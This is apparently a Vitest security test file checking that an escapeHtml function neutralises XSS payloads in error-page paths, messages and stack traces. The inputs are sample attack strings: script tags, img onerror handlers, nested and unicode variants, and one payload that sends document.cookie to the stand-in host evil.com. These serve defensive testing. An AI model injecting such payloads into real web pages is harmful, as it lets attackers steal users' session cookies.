/**
 * Error Page Security Tests
 *
 * Tests that error page rendering properly escapes user-controlled content
 * to prevent XSS attacks.
 */

import { describe, expect, it } from 'vitest';
import { escapeHtml } from '../src/utils/html';

describe('Error Page XSS Prevention', () => {
  // These tests verify that the escapeHtml function properly sanitizes
  // content that would be displayed in the error page (path, error.message, error.stack)

  describe('path escaping', () => {
    it('escapes script tags in path', () => {
      const maliciousPath = '/subject/<script>alert("xss")</script>';
      const escaped = escapeHtml(maliciousPath);
      expect(escaped).not.toContain('<script');
      expect(escaped).toBe('/subject/&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
    });

    it('escapes event handlers in path', () => {
      const maliciousPath = '/subject/<img src=x onerror="alert(1)">';
      const escaped = escapeHtml(maliciousPath);
      expect(escaped).not.toContain('<img');
      expect(escaped).toBe('/subject/&lt;img src=x onerror=&quot;alert(1)&quot;&gt;');
    });

    it('handles normal paths correctly', () => {
      const normalPath = '/subject/cs101/topic-1/subtopic-a';
      const escaped = escapeHtml(normalPath);
      expect(escaped).toBe(normalPath);
    });

    it('escapes HTML entities in path parameters', () => {
      const pathWithEntities = '/subject/test&param=<value>';
      const escaped = escapeHtml(pathWithEntities);
      expect(escaped).toBe('/subject/test&amp;param=&lt;value&gt;');
    });
  });

  describe('error message escaping', () => {
    it('escapes script tags in error message', () => {
      const maliciousMessage = 'Error: <script>document.location="http://evil.com?c="+document.cookie</script>';
      const escaped = escapeHtml(maliciousMessage);
      expect(escaped).not.toContain('<script');
      expect(escaped).toContain('&lt;script&gt;');
    });

    it('escapes HTML tags in error message', () => {
      const maliciousMessage = 'Error: <b onmouseover="alert(1)">hover me</b>';
      const escaped = escapeHtml(maliciousMessage);
      expect(escaped).not.toContain('<b');
      expect(escaped).toContain('&lt;b');
    });

    it('handles normal error messages correctly', () => {
      const normalMessage = 'Cannot read property "id" of undefined';
      const escaped = escapeHtml(normalMessage);
      expect(escaped).toBe('Cannot read property &quot;id&quot; of undefined');
    });

    it('handles error messages with stack-like content', () => {
      const message = 'TypeError: x is not a function\n    at Object.<anonymous>';
      const escaped = escapeHtml(message);
      // Note: angle brackets in stack traces are escaped for safety
      expect(escaped).toBe('TypeError: x is not a function\n    at Object.&lt;anonymous&gt;');
    });
  });

  describe('error stack escaping', () => {
    it('escapes script tags in error stack', () => {
      const maliciousStack = 'Error: test\n    at <script>alert(1)</script>:1:1';
      const escaped = escapeHtml(maliciousStack);
      expect(escaped).not.toContain('<script');
      expect(escaped).toContain('&lt;script&gt;');
    });

    it('escapes img tags in error stack', () => {
      const maliciousStack = 'Error: test\n    at <img/src/onerror=alert(1)>:1:1';
      const escaped = escapeHtml(maliciousStack);
      expect(escaped).not.toContain('<img');
    });

    it('handles normal error stacks correctly', () => {
      const normalStack = `Error: Something went wrong
    at Function.execute (/app/src/index.ts:42:15)
    at processTicksAndRejections (node:internal/process/task_queues:95:5)`;
      const escaped = escapeHtml(normalStack);
      expect(escaped).toBe(normalStack);
    });

    it('handles stacks with file paths containing special chars', () => {
      const stack = 'Error: test\n    at /path/with/ampersand&file.ts:10:5';
      const escaped = escapeHtml(stack);
      expect(escaped).toContain('&amp;');
    });
  });

  describe('combined attack vectors', () => {
    it('handles combination of path and message attacks', () => {
      const pathPayload = '<script>alert(1)</script>';
      const messagePayload = '<img src=x onerror="alert(2)">';

      const escapedPath = escapeHtml(pathPayload);
      const escapedMessage = escapeHtml(messagePayload);

      expect(escapedPath).not.toContain('<script');
      expect(escapedMessage).not.toContain('<img');
    });

    it('handles nested script attempts', () => {
      const nestedPayload = '<<script>script>alert(1)<</script>/script>';
      const escaped = escapeHtml(nestedPayload);
      expect(escaped).not.toContain('<script');
      expect(escaped).not.toContain('</script>');
    });

    it('handles unicode-based attacks', () => {
      const unicodePayload = '\u003cscript\u003ealert(1)\u003c/script\u003e';
      const escaped = escapeHtml(unicodePayload);
      expect(escaped).not.toContain('<script');
    });
  });

  describe('real-world error scenarios', () => {
    it('handles ReferenceError messages', () => {
      const error = 'ReferenceError: someVariable is not defined';
      const escaped = escapeHtml(error);
      expect(escaped).toBe(error);
    });

    it('handles TypeError with object notation', () => {
      const error = "TypeError: Cannot read properties of undefined (reading 'map')";
      const escaped = escapeHtml(error);
      expect(escaped).toBe("TypeError: Cannot read properties of undefined (reading &#39;map&#39;)");
    });

    it('handles SyntaxError with code snippet', () => {
      const error = 'SyntaxError: Unexpected token < in JSON at position 0';
      const escaped = escapeHtml(error);
      expect(escaped).toBe('SyntaxError: Unexpected token &lt; in JSON at position 0');
    });

    it('handles paths with query strings', () => {
      const path = '/search?q=<script>alert(1)</script>&page=1';
      const escaped = escapeHtml(path);
      expect(escaped).not.toContain('<script');
      expect(escaped).toContain('&lt;script&gt;');
      expect(escaped).toContain('&amp;page=1');
    });

    it('handles paths with hash fragments', () => {
      const path = '/page#<script>alert(1)</script>';
      const escaped = escapeHtml(path);
      expect(escaped).not.toContain('<script');
    });
  });
});
